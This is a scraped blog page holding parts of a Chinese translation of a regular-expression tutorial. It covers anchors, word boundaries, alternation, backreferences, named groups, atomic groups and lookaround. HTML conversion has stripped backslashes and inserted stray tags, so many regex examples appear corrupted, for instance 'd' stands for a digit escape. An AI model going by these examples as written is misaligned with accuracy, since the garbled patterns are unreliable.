<p><span lang="ZH-CN" style="font-family: 宋体;">&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配一个单个的字符而不用关心被匹配的字符是什么。唯一的例外是新行符。在本教程中谈到的引擎，缺省情况下都是不匹配新行符的。因此在缺省情况下，&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;等于是字符集</span><a href="Window">^nr</a><span lang="ZH-CN" style="font-family: 宋体;">或</span><a href="Unix">^n</a><span lang="ZH-CN" style="font-family: 宋体;">的简写。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">这个例外是因为历史的原因。因为早期使用正则表达式的工具是基于行的。它们都是一行一行的读入一个文件，将正则表达式分别应用到每一行上去。在这些工具中，字符串是不包含新行符的。因此&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;也就从不匹配新行符。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">现代的工具和语言能够将正则表达式应用到很大的字符串甚至整个文件上去。本教程讨论的所有正则表达式实现都提供一个选项，可以使&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配所有的字符，包括新行符。在</span>RegexBuddy, EditPad Pro<span lang="ZH-CN" style="font-family: 宋体;">或</span>PowerGREP<span lang="ZH-CN" style="font-family: 宋体;">等工具中，你可以简单的选中&ldquo;点号匹配新行符&rdquo;。在</span>Perl<span lang="ZH-CN" style="font-family: 宋体;">中，&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;可以匹配新行符的模式被称作&ldquo;单行模式&rdquo;。很不幸，这是一个很容易混淆的名词。因为还有所谓&ldquo;多行模式&rdquo;。多行模式只影响行首行尾的锚定</span>(anchor)<span lang="ZH-CN" style="font-family: 宋体;">，而单行模式只影响&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">其他语言和正则表达式库也采用了</span>Perl<span lang="ZH-CN" style="font-family: 宋体;">的术语定义。当在</span>.NET Framework<span lang="ZH-CN" style="font-family: 宋体;">中使用正则表达式类时，你可以用类似下面的语句来激活单行模式：</span>Regex.Match(&ldquo;string&rdquo;,&rdquo;regex&rdquo;,RegexOptions.SingleLine)</p>
<p><o:p>&nbsp;</o:p></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">保守的使用点号&ldquo;</span>.<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">点号可以说是最强大的元字符。它允许你偷懒：用一个点号，就能匹配几乎所有的字符。但是问题在于，它也常常会匹配不该匹配的字符。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">我会以一个简单的例子来说明。让我们看看如何匹配一个具有&ldquo;</span>mm/dd/yy<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;格式的日期，但是我们想允许用户来选择分隔符。很快能想到的一个方案是</span>&lt;&lt;dd.dd.dd&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。看上去它能匹配日期&ldquo;</span>02/12/03<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。问题在于</span>02512703<span lang="ZH-CN" style="font-family: 宋体;">也会被认为是一个有效的日期。</span></p>
<p>&lt;&lt;dd[-/.]dd[-/.]dd&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">看上去是一个好一点的解决方案。记住点号在一个字符集里不是元字符。这个方案远不够完善，它会匹配&ldquo;</span>99/99/99<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。而</span>&lt;&lt;[0-1]d[-/.][0-3]d[-/.]dd&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">又更进一步。尽管他也会匹配&ldquo;</span>19/39/99<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。你想要你的正则表达式达到如何完美的程度取决于你想达到什么样的目的。如果你想校验用户输入，则需要尽可能的完美。如果你只是想分析一个已知的源，并且我们知道没有错误的数据，用一个比较好的正则表达式来匹配你想要搜寻的字符就已经足够。</span></p>
<p><strong><o:p>&nbsp;</o:p></strong></p>
<p><strong><span style=""><span style="">8.<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>**</strong><span lang="ZH-CN" style="font-family: 宋体;">字符串开始和结束的锚定</span><o:p></o:p>**</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">锚定和一般的正则表达式符号不同，它不匹配任何字符。相反，他们匹配的是字符之前或之后的位置。&ldquo;</span>^<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;匹配一行字符串第一个字符前的位置。</span>&lt;&lt;^a&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">将会匹配字符串&ldquo;</span>abc<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的</span>a<span lang="ZH-CN" style="font-family: 宋体;">。</span>&lt;&lt;^b&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">将不会匹配&ldquo;</span>abc<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的任何字符。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">类似的，</span>$<span lang="ZH-CN" style="font-family: 宋体;">匹配字符串中最后一个字符的后面的位置。所以</span>&lt;&lt;c$&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">匹配&ldquo;</span>abc<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;中的</span>c<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">锚定的应用</span><o:p></o:p></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">在编程语言中校验用户输入时，使用锚定是非常重要的。如果你想校验用户的输入为整数，用</span>&lt;&lt;^d+$&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">用户输入中，常常会有多余的前导空格或结束空格。你可以用</span>&lt;&lt;^s<em>&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">和</span>&lt;&lt;s</em>$&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">来匹配前导空格或结束空格。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">使用&ldquo;</span>^<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;和&ldquo;</span>$<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;作为行的开始和结束锚定</span><o:p></o:p></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">如果你有一个包含了多行的字符串。例如：&ldquo;</span>first linenrsecond line<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;</span>(<span lang="ZH-CN" style="font-family: 宋体;">其中</span>nr<span lang="ZH-CN" style="font-family: 宋体;">表示一个新行符</span>)<span lang="ZH-CN" style="font-family: 宋体;">。常常需要对每行分别处理而不是整个字符串。因此，几乎所有的正则表达式引擎都提供一个选项，可以扩展这两种锚定的含义。&ldquo;</span>^<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;可以匹配字串的开始位置</span>(<span lang="ZH-CN" style="font-family: 宋体;">在</span>f<span lang="ZH-CN" style="font-family: 宋体;">之前</span>)<span lang="ZH-CN" style="font-family: 宋体;">，以及每一个新行符的后面位置</span>(<span lang="ZH-CN" style="font-family: 宋体;">在</span>nr<span lang="ZH-CN" style="font-family: 宋体;">和</span>s<span lang="ZH-CN" style="font-family: 宋体;">之间</span>)<span lang="ZH-CN" style="font-family: 宋体;">。类似的，</span>$<span lang="ZH-CN" style="font-family: 宋体;">会匹配字串的结束位置</span>(<span lang="ZH-CN" style="font-family: 宋体;">最后一个</span>e<span lang="ZH-CN" style="font-family: 宋体;">之后</span>)<span lang="ZH-CN" style="font-family: 宋体;">，以及每个新行符的前面</span>(<span lang="ZH-CN" style="font-family: 宋体;">在</span>e<span lang="ZH-CN" style="font-family: 宋体;">与</span>nr<span lang="ZH-CN" style="font-family: 宋体;">之间</span>)<span lang="ZH-CN" style="font-family: 宋体;">。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">在</span>.NET<span lang="ZH-CN" style="font-family: 宋体;">中，当你使用如下代码时，将会定义锚定匹配每一个新行符的前面和后面位置：</span>Regex.Match(&quot;string&quot;, &quot;regex&quot;, RegexOptions.Multiline)</p>
<p><span lang="ZH-CN" style="font-family: 宋体;">应用：</span>string str = Regex.Replace(Original, &quot;^&quot;, &quot;&gt; &quot;, RegexOptions.Multiline)–<span lang="ZH-CN" style="font-family: 宋体;">将会在每行的行首插入&ldquo;</span>&gt; <span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span></p>
<p><o:p>&nbsp;</o:p></p>
<p><span style="font-family: Symbol;"><span style="">&middot;<span style="font-family: 'Times New Roman'; font-style: normal; font-variant: normal; font-weight: normal; font-size: 7pt; line-height: normal; font-size-adjust: none; font-stretch: normal;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span><span lang="ZH-CN" style="font-family: 宋体;">绝对锚定</span><o:p></o:p></p>
<p>&lt;&lt;A&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">只匹配整个字符串的开始位置，</span>&lt;&lt;Z&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">只匹配整个字符串的结束位置。即使你使用了&ldquo;多行模式&rdquo;，</span>&lt;&lt;A&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">和</span>&lt;&lt;Z&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">也从不匹配新行符。</span></p>
<p><span lang="ZH-CN" style="font-family: 宋体;">即使</span>Z<span lang="ZH-CN" style="font-family: 宋体;">和</span>$<span lang="ZH-CN" style="font-family: 宋体;">只匹配字符串的结束位置，仍然有一个例外的情况。如果字符串以新行符结束，则</span>Z<span lang="ZH-CN" style="font-family: 宋体;">和</span>$<span lang="ZH-CN" style="font-family: 宋体;">将会匹配新行符前面的位置，而不是整个字符串的最后面。这个&ldquo;改进&rdquo;是由</span>Perl<span lang="ZH-CN" style="font-family: 宋体;">引进的，然后被许多的正则表达式实现所遵循，包括</span>Java<span lang="ZH-CN" style="font-family: 宋体;">，</span>.NET<span lang="ZH-CN" style="font-family: 宋体;">等。如果应用</span>&lt;&lt;^[a-z]+$&gt;&gt;<span lang="ZH-CN" style="font-family: 宋体;">到&ldquo;</span>joen<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;，则匹配结果是&ldquo;</span>joe<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;而不是&ldquo;</span>joen<span lang="ZH-CN" style="font-family: 宋体;">&rdquo;。</span></p>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>


    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2008/03/23/匹配到二进制文件_(标准输入)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="九王爷">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="九王爷">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2008/03/23/匹配到二进制文件_(标准输入)/" itemprop="url">
                  深入浅出之正则表达式（二）
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2008-03-23T22:52:56+08:00">
                2008-03-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Other/" itemprop="url" rel="index">
                    <span itemprop="name">Other</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>`前言：<br>       本文是前一片文章《深入浅出之正则表达式（一）》的续篇，在本文中讲述了正则表达式中的组与向后引用，先前向后查看，条件测试，单词边界，选择符等表达式及例子，并分析了正则引擎在执行匹配时的内部机理。<br>       本文是Jan Goyvaerts为RegexBuddy写的教程的译文，版权归原作者所有，欢迎转载。但是为了尊重原作者和译者的劳动，请注明出处！谢谢！</p>
<p>9.      单词边界</p>
<p>元字符&lt;**&gt;也是一种对位置进行匹配的“锚”。这种匹配是0长度匹配。</p>
<p>有4种位置被认为是“单词边界”：</p>
<p>1)        在字符串的第一个字符前的位置(如果字符串的第一个字符是一个“单词字符”)</p>
<p>2)        在字符串的最后一个字符后的位置(如果字符串的最后一个字符是一个“单词字符”)</p>
<p>3)        在一个“单词字符”和“非单词字符”之间，其中“非单词字符”紧跟在“单词字符”之后</p>
<p>4)        在一个“非单词字符”和“单词字符”之间，其中“单词字符”紧跟在“非单词字符”后面</p>
<p> “单词字符”是可以用“w”匹配的字符，“非单词字符”是可以用“W”匹配的字符。在大多数的正则表达式实现中，“单词字符”通常包括&lt;&lt;[a-zA-Z0-9_]&gt;&gt;。</p>
<p>例如：&lt;<b4b>&gt;能够匹配单个的4而不是一个更大数的一部分。这个正则表达式不会匹配“44”中的4。</b4b></p>
<p>换种说法，几乎可以说&lt;<b>&gt;匹配一个“字母数字序列”的开始和结束的位置。</b></p>
<p>“单词边界”的取反集为&lt;<b>&gt;，他要匹配的位置是两个“单词字符”之间或者两个“非单词字符”之间的位置。</b></p>
<p>·        深入正则表达式引擎内部</p>
<p>让我们看看把正则表达式&lt;<bisb>&gt;应用到字符串“This island is beautiful”。引擎先处理符号&lt;<b>&gt;。因为b是0长度 ，所以第一个字符T前面的位置会被考察。因为T是一个“单词字符”，而它前面的字符是一个空字符(void)，所以b匹配了单词边界。接着<_>和第一个字符“T”匹配失败。匹配过程继续进行，直到第五个空格符，和第四个字符“s”之间又匹配了&lt;<b>&gt;。然而空格符和&lt;<i>&gt;不匹配。继续向后，到了第六个字符“i”，和第五个空格字符之间匹配了&lt;<b>&gt;，然后&lt;<is>&gt;和第六、第七个字符都匹配了。然而第八个字符和第二个“单词边界”不匹配，所以匹配又失败了。到了第13个字符i，因为和前面一个空格符形成“单词边界”，同时&lt;<is>&gt;和“is”匹配。引擎接着尝试匹配第二个&lt;<b>&gt;。因为第15个空格符和“s”形成单词边界，所以匹配成功。引擎“急着”返回成功匹配的结果。</b></is></is></b></i></b></_></b></bisb></p>
<p>10.  选择符</p>
<p>正则表达式中“|”表示选择。你可以用选择符匹配多个可能的正则表达式中的一个。</p>
<p>如果你想搜索文字“cat”或“dog”，你可以用&lt;<cat|dog>&gt;。如果你想有更多的选择，你只要扩展列表&lt;<cat|dog|mouse|fish>&gt;。</cat|dog|mouse|fish></cat|dog></p>
<p>选择符在正则表达式中具有最低的优先级，也就是说，它告诉引擎要么匹配选择符左边的所有表达式，要么匹配右边的所有表达式。你也可以用圆括号来限制选择符的作用范围。如&lt;<b(cat|dog)b>&gt;，这样告诉正则引擎把(cat|dog)当成一个正则表达式单位来处理。</b(cat|dog)b></p>
<p>·        注意正则引擎的“急于表功”性</p>
<p>正则引擎是急切的，当它找到一个有效的匹配时，它会停止搜索。因此在一定条件下，选择符两边的表达式的顺序对结果会有影响。假设你想用正则表达式搜索一个编程语言的函数列表：Get，GetValue，Set或SetValue。一个明显的解决方案是&lt;<get|getvalue|set|setvalue>&gt;。让我们看看当搜索SetValue时的结果。</get|getvalue|set|setvalue></p>
<p>因为&lt;<get>&gt;和&lt;<getvalue>&gt;都失败了，而&lt;<set>&gt;匹配成功。因为正则导向的引擎都是“急切”的，所以它会返回第一个成功的匹配，就是“Set”，而不去继续搜索是否有其他更好的匹配。</set></getvalue></get></p>
<p>和我们期望的相反，正则表达式并没有匹配整个字符串。有几种可能的解决办法。一是考虑到正则引擎的“急切”性，改变选项的顺序，例如我们使用&lt;<getvalue|get|setvalue|set>&gt;，这样我们就可以优先搜索最长的匹配。我们也可以把四个选项结合起来成两个选项：&lt;<get(value)?|set(value)?>&gt;。因为问号重复符是贪婪的，所以SetValue总会在Set之前被匹配。</get(value)?|set(value)?></getvalue|get|setvalue|set></p>
<p>一个更好的方案是使用单词边界：&lt;<b(get|getvalue|set|setvalue)b>&gt;或&lt;<b(get(value)?|set(value)?b>&gt;。更进一步，既然所有的选择都有相同的结尾，我们可以把正则表达式优化为&lt;<b(get|set)(value)?b>&gt;。</b(get|set)(value)?b></b(get(value)?|set(value)?b></b(get|getvalue|set|setvalue)b></p>
<p>11.  组与向后引用</p>
<p>把正则表达式的一部分放在圆括号内，你可以将它们形成组。然后你可以对整个组使用一些正则操作，例如重复操作符。</p>
<p>要注意的是，只有圆括号“()”才能用于形成组。“[]”用于定义字符集。“{}”用于定义重复操作。</p>
<p>当用“()”定义了一个正则表达式组后，正则引擎则会把被匹配的组按照顺序编号，存入缓存。当对被匹配的组进行向后引用的时候，可以用“数字”的方式进行引用。&lt;<1>&gt;引用第一个匹配的后向引用组，&lt;<2>&gt;引用第二个组，以此类推，&lt;<n>&gt;引用第n个组。而&lt;&lt; &gt;&gt;则引用整个被匹配的正则表达式本身。我们看一个例子。</n></2></1></p>
<p>假设你想匹配一个HTML标签的开始标签和结束标签，以及标签中间的文本。比如<b>This is a test<strong>，我们要匹配</strong>和<em>*以及中间的文字。我们可以用如下正则表达式：“&lt;([A-Z][A-Z0-9]</em>)[^&gt;]<em>&gt;.</em>?”</b></p>
<p>首先，“&lt;”将会匹配“<strong>”的第一个字符“&lt;”。然后[A-Z]匹配B，[A-Z0-9]<em>将会匹配0到多次字母数字，后面紧接着0到多个非“&gt;”的字符。最后正则表达式的“&gt;”将会匹配“<b>”的“&gt;”。接下来正则引擎将对结束标签之前的字符进行惰性匹配，直到遇到一个“&lt;/”符号。然后正则表达式中的“1”表示对前面匹配的组“([A-Z][A-Z0-9]</b></em>)”进行引用，在本例中，被引用的是标签名“B”。所以需要被匹配的结尾标签为“</strong>”</p>
<p>你可以对相同的后向引用组进行多次引用，&lt;&lt;([a-c])x1x1&gt;&gt;将匹配“axaxa”、“bxbxb”以及“cxcxc”。如果用数字形式引用的组没有有效的匹配，则引用到的内容简单的为空。</p>
<p>一个后向引用不能用于它自身。&lt;&lt;([abc]1)&gt;&gt;是错误的。因此你不能将&lt;&lt; &gt;&gt;用于一个正则表达式匹配本身，它只能用于替换操作中。</p>
<p>后向引用不能用于字符集内部。&lt;&lt;(a)[1b]&gt;&gt;中的&lt;<1>&gt;并不表示后向引用。在字符集内部，&lt;<1>&gt;可以被解释为八进制形式的转码。</1></1></p>
<p>向后引用会降低引擎的速度，因为它需要存储匹配的组。如果你不需要向后引用，你可以告诉引擎对某个组不存储。例如：&lt;<get(?:value)>&gt;。其中“(”后面紧跟的“?:”会告诉引擎对于组(Value)，不存储匹配的值以供后向引用。</get(?:value)></p>
<p>·        重复操作与后向引用</p>
<p>当对组使用重复操作符时，缓存里后向引用内容会被不断刷新，只保留最后匹配的内容。例如：&lt;&lt;([abc]+)=1&gt;&gt;将匹配“cab=cab”，但是&lt;&lt;([abc])+=1&gt;&gt;却不会。因为([abc])第一次匹配“c”时，“1”代表“c”；然后([abc])会继续匹配“a”和“b”。最后“1”代表“b”，所以它会匹配“cab=b”。</p>
<p>应用：检查重复单词–当编辑文字时，很容易就会输入重复单词，例如“the the”。使用&lt;<b(w+)s+1b>&gt;可以检测到这些重复单词。要删除第二个单词，只要简单的利用替换功能替换掉“1”就可以了。</b(w+)s+1b></p>
<p>·        组的命名和引用</p>
<p>在PHP，Python中，可以用&lt;&lt;(?P<name>group)&gt;&gt;来对组进行命名。在本例中，词法?P<name>就是对组(group)进行了命名。其中name是你对组的起的名字。你可以用(?P=name)进行引用。</name></name></p>
<p>.NET的命名组</p>
<p>.NET framework也支持命名组。不幸的是，微软的程序员们决定发明他们自己的语法，而不是沿用Perl、Python的规则。目前为止，还没有任何其他的正则表达式实现支持微软发明的语法。</p>
<p>下面是.NET中的例子：</p>
<p>(?<first>group)(?’second’group)</first></p>
<p>正如你所看到的，.NET提供两种词法来创建命名组：一是用尖括号“&lt;&gt;”，或者用单引号“’’”。尖括号在字符串中使用更方便，单引号在ASP代码中更有用，因为ASP代码中“&lt;&gt;”被用作HTML标签。</p>
<p>要引用一个命名组，使用k<name>或k’name’.</name></p>
<p>当进行搜索替换时，你可以用“${name}”来引用一个命名组。</p>
<p>12.  正则表达式的匹配模式</p>
<p>本教程所讨论的正则表达式引擎都支持三种匹配模式：</p>
<p><_>使正则表达式对大小写不敏感，</_></p>
<p>&lt;&gt;开启“单行模式”，即点号“.”匹配新行符</p>
<p>&lt;&gt;开启“多行模式”，即“^”和“$”匹配新行符的前面和后面的位置。</p>
<p>·        在正则表达式内部打开或关闭模式</p>
<p>如果你在正则表达式内部插入修饰符(?ism)，则该修饰符只对其右边的正则表达式起作用。(?-i)是关闭大小写不敏感。你可以很快的进行测试。&lt;&lt;(?i)te(?-i)st&gt;&gt;应该匹配TEst，但是不能匹配teST或TEST.</p>
<p>13.  原子组与防止回溯</p>
<p>在一些特殊情况下，因为回溯会使得引擎的效率极其低下。</p>
<p>让我们看一个例子：要匹配这样的字串，字串中的每个字段间用逗号做分隔符，第12个字段由P开头。</p>
<p>我们容易想到这样的正则表达式&lt;&lt;^(.*?,){11}P&gt;&gt;。这个正则表达式在正常情况下工作的很好。但是在极端情况下，如果第12个字段不是由P开头，则会发生灾难性的回溯。如要搜索的字串为“1,2,3,4,5,6,7,8,9,10,11,12,13”。首先，正则表达式一直成功匹配直到第12个字符。这时，前面的正则表达式消耗的字串为“1,2,3,4,5,6,7,8,9,10,11,”，到了下一个字符，&lt;</p><p>&gt;并不匹配“12”。所以引擎进行回溯，这时正则表达式消耗的字串为“1,2,3,4,5,6,7,8,9,10,11”。继续下一次匹配过程，下一个正则符号为点号&lt;&lt;.&gt;&gt;，可以匹配下一个逗号“,”。然而&lt;&lt;，&gt;&gt;并不匹配字符“12”中的“1”。匹配失败，继续回溯。大家可以想象，这样的回溯组合是个非常大的数量。因此可能会造成引擎崩溃。</p>
<p>用于阻止这样巨大的回溯有几种方案：</p>
<p>一种简单的方案是尽可能的使匹配精确。用取反字符集代替点号。例如我们用如下正则表达式&lt;&lt;^([^,rn]*,){11}P&gt;&gt;，这样可以使失败回溯的次数下降到11次。</p>
<p>另一种方案是使用原子组。</p>
<p>原子组的目的是使正则引擎失败的更快一点。因此可以有效的阻止海量回溯。原子组的语法是&lt;&lt;(?&gt;正则表达式)&gt;&gt;。位于(?&gt;)之间的所有正则表达式都会被认为是一个单一的正则符号。一旦匹配失败，引擎将会回溯到原子组前面的正则表达式部分。前面的例子用原子组可以表达成&lt;&lt;^(?&gt;(.*?,){11})P&gt;&gt;。一旦第十二个字段匹配失败，引擎回溯到原子组前面的&lt;&lt;^&gt;&gt;。</p>
<p>14.  向前查看与向后查看</p>
<p>Perl 5 引入了两个强大的正则语法：“向前查看”和“向后查看”。他们也被称作“零长度断言”。他们和锚定一样都是零长度的（所谓零长度即指该正则表达式不消耗被匹配的字符串）。不同之处在于“前后查看”会实际匹配字符，只是他们会抛弃匹配只返回匹配结果：匹配或不匹配。这就是为什么他们被称作“断言”。他们并不实际消耗字符串中的字符，而只是断言一个匹配是否可能。</p>
<p>几乎本文讨论的所有正则表达式的实现都支持“向前向后查看”。唯一的一个例外是Javascript只支持向前查看。</p>
<p>·        肯定和否定式的向前查看</p>
<p>如我们前面提过的一个例子：要查找一个q，后面没有紧跟一个u。也就是说，要么q后面没有字符，要么后面的字符不是u。采用否定式向前查看后的一个解决方案为&lt;<q(?!u)>&gt;。否定式向前查看的语法是&lt;&lt;(?!查看的内容)&gt;&gt;。</q(?!u)></p>
<p>肯定式向前查看和否定式向前查看很类似：&lt;&lt;(?=查看的内容)&gt;&gt;。</p>
<p>如果在“查看的内容”部分有组，也会产生一个向后引用。但是向前查看本身并不会产生向后引用，也不会被计入向后引用的编号中。这是因为向前查看本身是会被抛弃掉的，只保留匹配与否的判断结果。如果你想保留匹配的结果作为向后引用，你可以用&lt;&lt;(?=(regex))&gt;&gt;来产生一个向后引用。</p>
<p>·        肯定和否定式的先后查看</p>
<p>向后查看和向前查看有相同的效果，只是方向相反</p>
<p>否定式向后查看的语法是：&lt;&lt;(?&lt;!查看内容)&gt;&gt;</p>
<p>肯定式向后查看的语法是：&lt;&lt;(?&lt;=查看内容)&gt;&gt;</p>
<p>我们可以看到，和向前查看相比，多了一个表示方向的左尖括号。</p>
<p>例：&lt;&lt;(?&lt;!a)b&gt;&gt;将会匹配一个没有“a”作前导字符的“b”。</p>
<p>值得注意的是：向前查看从当前字符串位置开始对“查看”正则表达式进行匹配；向后查看则从当前字符串位置开始先后回溯一个字符，然后再开始对“查看”正则表达式进行匹配。</p>
<p>·        深入正则表达式引擎内部</p>
<p>让我们看一个简单例子。</p>
<p>把正则表达式&lt;<q(?!u)>&gt;应用到字符串“Iraq”。正则表达式的第一个符号是&lt;<q>&gt;。正如我们知道的，引擎在匹配&lt;<q>&gt;以前会扫过整个字符串。当第四个字符“q”被匹配后，“q”后面是空字符(void)。而下一个正则符号是向前查看。引擎注意到已经进入了一个向前查看正则表达式部分。下一个正则符号是&lt;<u>&gt;，和空字符不匹配，从而导致向前查看里的正则表达式匹配失败。因为是一个否定式的向前查看，意味着整个向前查看结果是成功的。于是匹配结果“q”被返回了。</u></q></q></q(?!u)></p>
<p>我们在把相同的正则表达式应用到“quit”。&lt;<q>&gt;匹配了“q”。下一个正则符号是向前查看部分的&lt;<u>&gt;，它匹配了字符串中的第二个字符“i”。引擎继续走到下个字符“i”。然而引擎这时注意到向前查看部分已经处理完了，并且向前查看已经成功。于是引擎抛弃被匹配的字符串部分，这将导致引擎回退到字符“u”。</u></q></p>
<p>因为向前查看是否定式的，意味着查看部分的成功匹配导致了整个向前查看的失败，因此引擎不得不进行回溯。最后因为再没有其他的“q”和&lt;<q>&gt;匹配，所以整个匹配失败了。</q></p>
<p>为了确保你能清楚地理解向前查看的实现，让我们把&lt;<q(?=u)i>&gt;应用到“quit”。&lt;<q>&gt;首先匹配“q”。然后向前查看成功匹配“u”，匹配的部分被抛弃，只返回可以匹配的判断结果。引擎从字符“i”回退到“u”。由于向前查看成功了，引擎继续处理下一个正则符号&lt;<i>&gt;。结果发现&lt;<i>&gt;和“u”不匹配。因此匹配失败了。由于后面没有其他的“q”，整个正则表达式的匹配失败了。</i></i></q></q(?=u)i></p>
<p>·        更进一步理解正则表达式引擎内部机制</p>
<p>让我们把&lt;&lt;(?&lt;=a)b&gt;&gt;应用到“thingamabob”。引擎开始处理向后查看部分的正则符号和字符串中的第一个字符。在这个例子中，向后查看告诉正则表达式引擎回退一个字符，然后查看是否有一个“a”被匹配。因为在“t”前面没有字符，所以引擎不能回退。因此向后查看失败了。引擎继续走到下一个字符“h”。再一次，引擎暂时回退一个字符并检查是否有个“a”被匹配。结果发现了一个“t”。向后查看又失败了。</p>
<p>向后查看继续失败，直到正则表达式到达了字符串中的“m”，于是肯定式的向后查看被匹配了。因为它是零长度的，字符串的当前位置仍然是“m”。下一个正则符号是&lt;<b>&gt;，和“m”匹配失败。下一个字符是字符串中的第二个“a”。引擎向后暂时回退一个字符，并且发现&lt;<a>&gt;不匹配“m”。</a></b></p>
<p>在下一个字符是字符串中的第一个“b”。引擎暂时性的向后退一个字符发现向后查看被满足了，同时&lt;<b>&gt;匹配了“b”。因此整个正则表达式被匹配了。作为结果，正则表达式返回字符串中的第一个“b”。</b></p>
<p>·        向前向后查看的应用</p>
<p>我们来看这样一个例子：查找一个具有6位字符的，含有“cat”的单词。</p>
<p>首先，我们可以不用向前向后查看来解决问题，例如：</p>
<p>&lt;&lt; catw{3}|wcatw{2}|w{2}catw|w{3}cat&gt;&gt;</p>
<p>足够简单吧！但是当需求变成查找一个具有6-12位字符，含有“cat”，“dog”或“mouse”的单词时，这种方法就变得有些笨拙了。</p>
<p>我们来看看使用向前查看的方案。在这个例子中，我们有两个基本需求要满足：一是我们需要一个6位的字符，二是单词含有“cat”。</p>
